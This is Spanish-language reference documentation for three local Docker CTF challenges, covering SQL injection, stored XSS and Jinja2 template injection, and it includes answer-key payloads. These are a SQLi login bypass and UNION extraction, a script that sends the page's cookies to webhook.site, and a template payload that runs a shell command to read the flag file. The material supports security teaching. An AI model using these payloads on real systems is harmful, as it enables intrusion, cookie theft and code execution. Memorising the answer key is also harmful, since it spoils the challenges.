# Challenges — Documentación de Referencia

Tres challenges Docker completamente independientes. Cada uno expone una vulnerabilidad clásica de seguridad web.

## Tabla de resumen

| Slug | Nombre | Imagen | Puerto interno | Vector | Dificultad | Puntos |
|------|--------|--------|---------------|--------|------------|--------|
| `sqli` | The Database Whisperer | `ctf-sqli:latest` | 5000 | SQL Injection clásico | Fácil | 100 |
| `xss` | The Guestbook | `ctf-xss:latest` | 3000 | Stored XSS + Cookie exfiltration | Fácil | 150 |
| `ssti` | Welcome, {{ user }} | `ctf-ssti:latest` | 5000 | SSTI Jinja2 → RCE | Fácil-Media | 200 |

---

## Quick start (desde cero)

```bash
# 1. Generar flags
./scripts/generate_flags.sh

# 2. Buildear imágenes
./scripts/build_challenges.sh

# 3. Smoke tests (SQLi y SSTI)
./scripts/test_challenges.sh
```

---

## Challenge 1 — SQL Injection (`ctf-sqli`)

**Puerto de testing manual:** 5001  
**Payload de referencia:**

```bash
# Login bypass
curl -s -X POST http://localhost:5001/login \
  --data-urlencode "username=' OR '1'='1' --" \
  --data-urlencode "password=x"

# UNION para extraer flags
curl -s -X POST http://localhost:5001/login \
  --data-urlencode "username=' UNION SELECT 1,value,3 FROM flags --" \
  --data-urlencode "password=x"
```

---

## Challenge 2 — Stored XSS (`ctf-xss`)

**Puerto de testing manual:** 5002  
**Payload de referencia:**

```html
<script>fetch('https://webhook.site/TU_ID?c='+document.cookie)</script>
```

Postear en el formulario de comentarios. Esperar ~30s al bot admin.  
El bot visita `/admin` con las cookies `role=admin` y `flag=CTF{...}`.

---

## Challenge 3 — SSTI (`ctf-ssti`)

**Puerto de testing manual:** 5003  
**Payloads de referencia:**

```bash
# Sanity check
curl -G http://localhost:5003/hello --data-urlencode "name={{7*7}}"
# → <h1>Hello, 49!</h1>

# Leer /flag.txt
curl -G http://localhost:5003/hello \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
```

---

## Flags

Las flags reales se generan con `scripts/generate_flags.sh` y van a `.env`.  
`.env` **no se commitea** (está en `.gitignore`).  
Las imágenes reciben la flag en build-time vía `--build-arg FLAG=...`.

## Correr un challenge individualmente

```bash
docker run --rm -p 5001:5000 ctf-sqli:latest
docker run --rm -p 5002:3000 ctf-xss:latest
docker run --rm -p 5003:5000 ctf-ssti:latest
```
